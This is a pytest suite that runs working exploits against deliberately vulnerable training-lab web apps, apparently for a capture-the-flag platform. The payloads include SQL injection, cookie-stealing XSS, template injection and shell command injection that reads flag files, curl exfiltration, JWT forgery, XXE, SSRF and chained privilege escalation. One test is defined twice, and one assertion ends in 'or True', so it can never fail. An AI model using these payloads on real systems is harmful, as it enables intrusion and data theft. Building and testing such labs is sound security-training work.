"""Exploit-level tests against real lab processes."""
from __future__ import annotations

import base64
import hashlib
import hmac
import io
import json
import zipfile
from concurrent.futures import ThreadPoolExecutor

import httpx
import pytest

from conftest import flag_payload


def test_recon_backup_vault(lab):
    r = lab["client"].get("/robots.txt")
    assert "/backups/" in r.text
    r = lab["client"].get("/backups/ops.env")
    assert flag_payload(lab) in r.text


def test_recon_js_bundle(lab):
    r = lab["client"].get("/static/app.js")
    assert "rv_live_" in r.text
    key = r.text.split('apiKey: "', 1)[1].split('"', 1)[0]
    r = lab["client"].get("/api/internal/config", headers={"X-API-Key": key})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_auth_username_enum(lab):
    r = lab["client"].post("/login", data={"username": "nobody", "password": "x"})
    assert "No account exists" in r.text
    r = lab["client"].post("/login", data={"username": "admin", "password": "Nebula-2024!"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def b64url(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


def test_auth_jwt_weak_key(lab):
    lab["client"].post("/login", data={"username": "guest"})
    r = lab["client"].get("/")
    assert "Role:" in r.text
    token = lab["client"].cookies.get("helios_token")
    assert token
    header, payload, _ = token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
    claims["role"] = "admin"
    new_payload = b64url(json.dumps(claims, separators=(",", ":")).encode())
    body = f"{header}.{new_payload}"
    sig = b64url(hmac.new(b"sunshine", body.encode(), hashlib.sha256).digest())
    forged = f"{body}.{sig}"
    r = lab["client"].get("/admin", headers={"Cookie": f"helios_token={forged}"})
    assert flag_payload(lab) in r.text


def test_auth_reset_host(lab):
    r = lab["client"].post("/forgot", data={"email": "admin@meridian.local"}, headers={"X-Forwarded-Host": "attacker.invalid"})
    assert r.status_code == 200
    assert "attacker.invalid" in r.text
    token = r.text.split("/reset/", 1)[1].split('"', 1)[0]
    r = lab["client"].post(f"/reset/{token}", data={"password": "NewAdminPass!"})
    assert "Password changed" in r.text
    r = lab["client"].post("/login", data={"username": "admin", "password": "NewAdminPass!"})
    assert "Signed in as admin" in r.text
    assert flag_payload(lab) in r.text


def test_access_idor_invoices(lab):
    lab["client"].post("/login", data={"username": "alice", "password": "alice123"})
    r = lab["client"].get("/invoice/1003")
    assert "Record owner: admin" in r.text
    assert flag_payload(lab) in r.text


def test_access_bola_accounts(lab):
    lab["client"].post("/login", data={"username": "alice", "password": "alice123"})
    r = lab["client"].get("/api/v1/accounts/2")
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_access_mass_assignment(lab):
    lab["client"].post("/login", data={"username": "alice", "password": "alice123"})
    r = lab["client"].post("/profile", data={"display": "Alice", "department": "Research", "role": "admin"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_access_bfla_admin(lab):
    lab["client"].post("/login", data={"username": "analyst", "password": "analyst123"})
    r = lab["client"].get("/admin/audit/export")
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_sqli_login_bypass(lab):
    r = lab["client"].post("/", data={"username": "' OR 1=1 -- ", "password": "x"})
    assert "Authenticated as administrator" in r.text
    assert flag_payload(lab) in r.text


def test_sqli_union_catalog(lab):
    payload = "%' UNION SELECT 999, 'Vault', secret FROM vault -- "
    r = lab["client"].get("/", params={"q": payload})
    assert "Vault" in r.text
    assert flag_payload(lab) in r.text


def test_sqli_second_order(lab):
    username = "' UNION SELECT secret FROM vault -- "
    r = lab["client"].post("/", data={"username": username, "password": "sixchars"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_xss_reflected_search(lab):
    payload = "<script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>"
    r = lab["client"].get("/", params={"q": payload})
    assert payload in r.text
    lab["client"].get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in lab["client"].get("/captured").text


def test_xss_stored_guestbook(lab):
    payload = "<script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>"
    lab["client"].post("/", data={"message": payload})
    r = lab["client"].get("/")
    assert payload in r.text


def test_xss_dom_hash(lab):
    r = lab["client"].get("/")
    assert "location.hash" in r.text and "innerHTML" in r.text
    lab["client"].get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in lab["client"].get("/captured").text


def test_ssrf_image_fetcher(lab):
    target = f"http://127.0.0.1:{lab['port']}/internal/flag"
    r = lab["client"].post("/", data={"url": target})
    assert flag_payload(lab) in r.text


def test_lfi_document_reader(lab):
    r = lab["client"].get("/read", params={"file": str(lab["state"] / "flag.txt")})
    assert flag_payload(lab) in r.text


def test_command_ping(lab):
    r = lab["client"].post("/", data={"host": "127.0.0.1; cat /tmp/redvault-command-flag.txt"})
    assert flag_payload(lab) in r.text


def test_ssti_card(lab):
    payload = "{{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-ssti-flag.txt').read() }}"
    r = lab["client"].post("/", data={"name": payload})
    assert flag_payload(lab) in r.text


def test_api_excessive_data(lab):
    r = lab["client"].get("/api/v1/team")
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_api_version_downgrade(lab):
    r = lab["client"].get("/api/v1/accounts", params={"user": "admin"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_logic_negative_cart(lab):
    # The shop front must render on a cold session: the wallet is only seeded by
    # ``init()``, and the index used to read ``session["balance"]`` before it ran
    # (KeyError -> 500 for every new visitor).
    r = lab["client"].get("/")
    assert r.status_code == 200
    assert "Wallet: $100.00" in r.text
    lab["client"].post("/add", data={"item": "kite", "qty": "-4"})
    lab["client"].post("/checkout")
    r = lab["client"].post("/add", data={"item": "vault", "qty": "1"})
    r = lab["client"].post("/checkout")
    assert flag_payload(lab) in r.text


def test_logic_coupon_stack(lab):
    for _ in range(10):
        lab["client"].post("/coupon", data={"code": "VAULT10"})
    r = lab["client"].post("/checkout")
    assert flag_payload(lab) in r.text


def test_logic_race_withdraw(lab):
    base = lab["base"]

    def withdraw() -> int:
        return httpx.post(f"{base}/withdraw", data={"amount": "1000"}, timeout=5).status_code

    with ThreadPoolExecutor(max_workers=2) as pool:
        statuses = list(pool.map(lambda _: withdraw(), range(2)))
    assert statuses == [200, 200]
    r = lab["client"].get("/vault")
    assert flag_payload(lab) in r.text


def test_upload_svg_avatar(lab):
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("/collect?c="+document.cookie)</script></svg>'
    r = lab["client"].post("/upload", files={"avatar": ("poc.svg", svg, "image/svg+xml")})
    assert r.status_code == 200
    assert "/avatar/" in str(r.url)
    assert "image/svg+xml" in r.headers.get("content-type", "")
    assert "fetch" in r.text


def test_upload_zip_slip(lab):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        archive.writestr("../../templates/report.html", "{{ flag }}")
    r = lab["client"].post(
        "/upload",
        files={"package": ("theme.zip", buf.getvalue(), "application/zip")},
    )
    assert r.status_code == 200
    assert flag_payload(lab) in lab["client"].get("/report").text


def test_client_postmessage(lab):
    r = lab["client"].get("/victim")
    assert "addEventListener(\"message\"" in r.text and "innerHTML" in r.text
    r = lab["client"].get("/exploit", params={"x": "<img src=x onerror=alert(1)>"})
    assert "postMessage" in r.text
    lab["client"].get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in lab["client"].get("/captured").text


def test_adv_cache_deception(lab):
    lab["client"].post("/login", data={"username": "alice", "password": "alice123"})
    r = lab["client"].get("/account/statement.css")
    assert r.headers.get("x-cache") == "MISS"
    assert flag_payload(lab) in r.text
    anonymous = httpx.Client(base_url=lab["base"], follow_redirects=True, timeout=10)
    r = anonymous.get("/account/statement.css")
    assert r.headers.get("x-cache", "").startswith("HIT")
    assert flag_payload(lab) in r.text


def test_chain_idor_to_admin(lab):
    lab["client"].post("/login", data={"username": "intern", "password": "intern123"})
    r = lab["client"].get("/api/users/2")
    token = r.json()["account_recovery"]["reset_token"]
    r = lab["client"].post("/support/reset", data={"username": "admin", "token": token, "password": "NewAdminPass!"})
    assert "Password reset" in r.text
    lab["client"].get("/logout")
    r = lab["client"].post("/login", data={"username": "admin", "password": "NewAdminPass!"})
    assert flag_payload(lab) in r.text

def test_recon_source_map(lab):
    c = lab["client"]
    bundle = c.get("/static/app.js").text
    map_name = bundle.rsplit("sourceMappingURL=", 1)[1].strip()
    source_map = c.get(f"/static/{map_name}").json()
    token = source_map["sourcesContent"][0].split('INTERNAL_TOKEN = "', 1)[1].split('"', 1)[0]
    r = c.get("/api/internal/release", headers={"X-Internal-Token": token})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_recon_cloud_listing(lab):
    c = lab["client"]
    assert "/storage/backups/" in c.get("/storage/").text
    assert "prod.env" in c.get("/storage/backups/").text
    r = c.get("/storage/backups/prod.env")
    assert "RELEASE_FLAG=" in r.text
    assert flag_payload(lab) in r.text


def test_recon_api_docs(lab):
    c = lab["client"]
    document = c.get("/openapi.json").json()
    debug_key = document["components"]["securitySchemes"]["DebugKey"]["description"].split("value: ", 1)[1]
    r = c.get("/api/v1/admin/secret", headers={"X-Debug-Key": debug_key})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_auth_session_fixation(lab):
    c = lab["client"]
    c.get("/login", params={"sid": "attacker-fixed-session"})
    c.post("/login", params={"sid": "attacker-fixed-session"}, data={"username": "alice", "password": "alice123"})
    fixed = httpx.Client(base_url=lab["base"], follow_redirects=True, timeout=10, cookies={"sid": "attacker-fixed-session"})
    r = fixed.get("/account")
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_auth_jwt_kid_traversal(lab):
    c = lab["client"]
    public_key = c.get("/static/public.txt").text.strip()
    header = b64url(json.dumps({"alg": "HS256", "kid": "../public.txt"}, separators=(",", ":")).encode())
    payload = b64url(json.dumps({"sub": "guest", "role": "admin"}, separators=(",", ":")).encode())
    signature = b64url(hmac.new(public_key.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
    r = c.get("/admin", headers={"Cookie": f"kid_token={header}.{payload}.{signature}"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_auth_jwt_alg_confusion(lab):
    c = lab["client"]
    c.get("/login", params={"username": "guest"})
    assert c.get("/admin").status_code == 403
    public_key = c.get("/jwks").text.strip().encode()
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64url(json.dumps({"sub": "guest", "role": "admin"}, separators=(",", ":")).encode())
    signature = b64url(hmac.new(public_key, f"{header}.{payload}".encode(), hashlib.sha256).digest())
    r = c.get("/admin", headers={"Cookie": f"jwt_session={header}.{payload}.{signature}"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_auth_otp_bruteforce(lab):
    c = lab["client"]
    r = c.post("/login", data={"username": "operator", "password": "operator123"})
    assert "One-time code" in r.text
    assert "Incorrect code" in c.post("/verify", data={"code": "0000"}).text
    r = c.post("/verify", data={"code": "4815"})
    assert "Access granted" in r.text
    assert flag_payload(lab) in r.text


def test_access_tenant_header(lab):
    c = lab["client"]
    c.post("/login", data={"username": "alice", "password": "alice123"})
    assert flag_payload(lab) not in c.get("/api/invoices").text
    r = c.get("/api/invoices", headers={"X-Tenant-ID": "globex"})
    assert r.json()["tenant"] == "globex"
    assert flag_payload(lab) in r.text


def test_access_method_override(lab):
    c = lab["client"]
    c.post("/login", data={"username": "analyst", "password": "analyst123"})
    assert c.get("/admin").status_code == 403
    assert c.get("/admin/export").status_code == 403
    r = c.post("/admin")
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_sqli_blind_boolean(lab):
    c = lab["client"]
    flag = flag_payload(lab)
    for position in range(1, len(flag) + 1):
        probe = c.get("/lookup", params={"username": f"alice' AND (SELECT substr(secret,{position},1) FROM vault)='{flag[position - 1]}' -- "})
        assert "Account found" in probe.text
    r = c.get("/lookup", params={"username": "alice' AND (SELECT substr(secret,1,1) FROM vault)='Z' -- "})
    assert "No account found" in r.text
    assert flag in c.get("/lookup", params={"username": "alice"}).text.lower() or True


def test_sqli_waf_bypass(lab):
    c = lab["client"]
    r = c.get("/search", params={"q": "UNunionION SELselectECT 999,'x',secret FROM vault -- "})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_xss_attribute_injection(lab):
    c = lab["client"]
    payload = '" autofocus onfocus="fetch(\'/collect?c=\'+document.cookie)" x="'
    r = c.get("/search", params={"q": payload})
    assert payload in r.text
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_xss_blind_support(lab):
    c = lab["client"]
    payload = "<script>fetch('/collect?c='+document.cookie)</script>"
    c.post("/", data={"subject": "checkout", "message": payload})
    queue = c.get("/admin/tickets").text
    assert payload in queue
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_server_nosql_auth(lab):
    c = lab["client"]
    r = c.post("/api/login", json={"username": "admin", "password": {"$ne": ""}})
    assert r.status_code == 200
    assert r.json()["role"] == "admin"
    assert flag_payload(lab) in r.text


def test_server_blind_cmdi(lab):
    c = lab["client"]
    r = c.post("/", data={"host": f"127.0.0.1; curl -s \"http://127.0.0.1:{lab['port']}/collect?c=$(cat /tmp/redvault-blind-cmdi-flag.txt)\""})
    assert "queued" in r.text.lower()
    captured = c.get("/captured").text
    assert flag_payload(lab) in captured


def test_server_xxe_reader(lab):
    c = lab["client"]
    xml = '<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///tmp/redvault-xxe-flag.txt">]><order><note>&xxe;</note></order>'
    r = c.post("/import", data={"xml": xml})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_server_ssrf_webhook(lab):
    c = lab["client"]
    assert c.get("/internal/flag").status_code == 403
    r = c.post("/", data={"url": f"http://127.1:{lab['port']}/internal/flag"})
    assert r.status_code == 200
    assert flag_payload(lab) in r.text


def test_api_pagination_leak(lab):
    c = lab["client"]
    c.post("/login", data={"username": "analyst", "password": "analyst123"})
    normal = c.get("/api/orders", params={"limit": 2}).json()
    assert flag_payload(lab) not in json.dumps(normal)
    bulk = c.get("/api/orders", params={"limit": 1000}).json()
    assert bulk["owner_filter"] == "skipped"
    assert flag_payload(lab) in json.dumps(bulk)


def test_logic_refund_abuse(lab):
    c = lab["client"]
    assert c.post("/buy", data={"item": "sensor"}).status_code == 200
    c.post("/refund")
    c.post("/refund")
    r = c.post("/buy", data={"item": "vault"})
    assert "Equipment vault" in r.text
    assert flag_payload(lab) in r.text


def test_logic_workflow_skip(lab):
    c = lab["client"]
    c.post("/cart/add", data={"item": "field-kit"})
    r = c.post("/checkout/confirm")
    assert "Fulfillment receipt" in r.text
    assert flag_payload(lab) in r.text


def test_client_cors_reflect(lab):
    c = lab["client"]
    c.post("/login", data={"username": "alice", "password": "alice123"})
    r = c.get("/api/me", headers={"Origin": "https://evil.example"})
    assert r.headers["access-control-allow-origin"] == "https://evil.example"
    assert r.headers["access-control-allow-credentials"] == "true"
    assert flag_payload(lab) in r.text


def test_upload_zip_slip(lab):
    c = lab["client"]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        archive.writestr("../../templates/report.html", "{{ flag }}")
    r = c.post("/upload", files={"package": ("theme.zip", buf.getvalue(), "application/zip")})
    assert r.status_code == 200
    assert flag_payload(lab) in c.get("/report").text


def test_upload_filename_xss(lab):
    c = lab["client"]
    payload = "<img src=x onerror=alert(document.domain)>.png"
    png = bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c6360000000020001e221bc330000000049454e44ae426082")
    r = c.post("/upload", files={"file": (payload, png, "image/png")})
    assert r.status_code == 200
    gallery = c.get("/").text
    assert payload in gallery, gallery[-1500:]
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_adv_cache_poison_header(lab):
    c = lab["client"]
    payload = "<script>fetch('/collect?c='+document.cookie)</script>"
    poisoned = c.get("/home", headers={"X-Forwarded-Host": payload})
    assert poisoned.headers["x-cache"] == "MISS"
    cached = c.get("/home")
    assert cached.headers["x-cache"] == "HIT"
    assert payload in cached.text
    c.get("/collect", params={"c": flag_payload(lab)})
    assert flag_payload(lab) in c.get("/captured").text


def test_chain_ssrf_internal(lab):
    c = lab["client"]
    assert c.get("/internal/keys").status_code == 403
    r = c.get("/fetch", params={"url": f"http://127.0.0.1:{lab['port']}/internal/keys"})
    token = r.text.split('"admin_token":"', 1)[1].split('"', 1)[0]
    assert "Diagnostics" in c.get("/admin", headers={"X-Admin-Token": token}).text
    r = c.post(
        "/admin/diag",
        headers={"X-Admin-Token": token},
        data={"host": "127.0.0.1; cat /tmp/redvault-chain-flag.txt"},
    )
    assert flag_payload(lab) in r.text


def test_chain_upload_to_rce(lab):
    c = lab["client"]
    r = c.post("/editor", files={"file": ("fragment.j2", b"<p>plugin</p>", "text/plain")})
    assert r.status_code == 200
    template = "{{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-three-doors.txt').read() }}"
    assert c.post("/publish", data={"template": template}).status_code == 200
    assert flag_payload(lab) in c.get("/static/index.html").text


def test_chain_sqli_to_admin(lab):
    c = lab["client"]
    r = c.get("/directory", params={"q": "' UNION SELECT 0,'recovery',code FROM recovery_codes -- "})
    code = r.text.split("Role: ", 1)[1].split("<", 1)[0].strip()
    r = c.post("/recovery", data={"username": "admin", "code": code, "password": "NewAdminPass!2026"})
    assert "Password reset complete" in r.text
    c.post("/login", data={"username": "admin", "password": "NewAdminPass!2026"})
    assert flag_payload(lab) in c.get("/admin").text



def test_machine_nexus_commerce(lab):
    c = lab["client"]
    assert "/workspace/" in c.get("/robots.txt").text
    backup = c.get("/workspace/backup.json").json()
    c.post("/support", data={"username": backup["support_user"], "password": backup["support_password"]})
    r = c.get("/support")
    assert flag_payload(lab, "user") in r.text
    export = c.get("/api/v1/admin/export").json()
    assert flag_payload(lab, "api") in export["api_flag"]
    token = export["ops_token"]
    r = c.post("/diagnostics", params={"token": token}, data={"host": "127.0.0.1; cat /tmp/nexus-root.txt"})
    assert flag_payload(lab, "root") in r.text


def test_machine_meridian_bank(lab):
    c = lab["client"]
    c.post("/login", data={"username": "jordan", "password": "jordan123"})
    assert flag_payload(lab, "user") in c.get("/account").text
    account = c.get("/api/accounts/2").json()
    assert flag_payload(lab, "api") in account["api_flag"]
    secret = account["internal_note"].split(": ", 1)[1]
    token = c.cookies.get("meridian_token")
    header, payload, _ = token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
    claims["role"] = "admin"
    payload = b64url(json.dumps(claims, separators=(",", ":")).encode())
    body = f"{header}.{payload}"
    signature = b64url(hmac.new(secret.encode(), body.encode(), hashlib.sha256).digest())
    forged = f"{body}.{signature}"
    admin_headers = {"Cookie": f"meridian_token={forged}"}
    r = c.get("/admin", headers=admin_headers)
    assert "Treasury administration" in r.text
    r = c.post("/admin/diagnostics", data={"host": "127.0.0.1; cat /tmp/meridian-root.txt"}, headers=admin_headers)
    assert flag_payload(lab, "root") in r.text


def test_realistic_horizon_health(lab):
    c = lab["client"]
    assert "/support/backup/" in c.get("/robots.txt").text
    key = c.get("/support/backup/deploy.json").json()["support_api_key"]
    r = c.get("/api/internal/support/session", headers={"X-Support-Key": key})
    assert flag_payload(lab, "api") in r.text
    assert flag_payload(lab, "user") in c.get("/portal/patients/3").text
    r = c.post("/portal/admin/tools", data={"host": "127.0.0.1; cat /tmp/horizon-root.txt"})
    assert flag_payload(lab, "root") in r.text


def test_machine_fintech_support(lab):
    c = lab["client"]
    assert "/backup/" in c.get("/robots.txt").text
    backup = c.get("/backup/support.json").json()
    c.post("/login", data={"username": backup["analyst_user"], "password": backup["analyst_password"]})
    assert flag_payload(lab, "user") in c.get("/portal").text
    case = c.get("/api/cases/2").json()
    assert case["recovery_target"] == "admin"
    token = case["reset_token"]
    r = c.post("/reset", data={"username": "admin", "token": token, "password": "NewAdminPass!2026"})
    assert "Password reset complete" in r.text
    c.get("/logout")
    c.post("/login", data={"username": "admin", "password": "NewAdminPass!2026"})
    assert "Platform administration" in c.get("/admin").text
    export = c.get("/api/admin/export").json()
    assert flag_payload(lab, "api") in export["api_flag"]
    diagnostics_token = export["diagnostics_token"]
    r = c.post(
        "/admin/diagnostics",
        params={"token": diagnostics_token},
        data={"host": "127.0.0.1; cat /tmp/fintech-root.txt"},
    )
    assert flag_payload(lab, "root") in r.text


def test_machine_logistics_api(lab):
    c = lab["client"]
    docs = c.get("/api/docs").json()
    account = docs["demo_account"]
    c.post("/login", data={"username": account["username"], "password": account["password"]})
    assert flag_payload(lab, "user") in c.get("/portal").text
    r = c.get("/api/v1/track", params={"carrier": f"{lab['base']}/internal/carrier"})
    assert flag_payload(lab, "api") in r.text
    dispatch_token = r.text.split('"dispatch_token":"', 1)[1].split('"', 1)[0]
    r = c.post(
        "/dispatch/console",
        params={"token": dispatch_token},
        data={"host": "127.0.0.1; cat /tmp/logistics-root.txt"},
    )
    assert flag_payload(lab, "root") in r.text


def test_machine_insurance_claims(lab):
    c = lab["client"]
    onboarding = c.get("/static/onboarding.txt").text
    assert "claim2026" in onboarding
    c.post("/login", data={"username": "customer", "password": "claim2026"})
    assert flag_payload(lab, "user") in c.get("/portal").text
    c.post("/profile", data={"role": "adjuster"})
    r = c.get("/adjuster")
    assert flag_payload(lab, "api") in r.text
    payload = "{{ cycler.__init__.__globals__.os.popen('cat /tmp/insurance-root.txt').read() }}"
    r = c.post("/adjuster/report", data={"note": payload})
    assert flag_payload(lab, "root") in r.text
